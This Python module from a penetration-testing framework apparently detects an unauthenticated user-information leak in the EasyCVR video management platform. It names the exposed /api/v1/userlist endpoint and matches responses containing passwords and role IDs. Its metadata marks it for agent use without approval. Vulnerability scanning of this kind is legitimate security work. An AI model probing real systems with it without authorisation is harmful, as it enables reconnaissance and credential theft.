#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""EasyCVR video management platform has leaked user information."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'EasyCVR video management - Users Information Exposure Detection',
        'description': 'EasyCVR video management platform has leaked user information',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'unauth', 'easycvr', 'misconfig', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/wy876/POC/blob/main/EasyCVR%20%E8%A7%86%E9%A2%91%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.md',
        ],
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('<title>EasyCVR',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/api/v1/userlist?pageindex=0&pagesize=10'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('count', 'Password', 'RoleId',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='EasyCVR video management - Users Information Exposure detected', path=path)
            return True
        return False

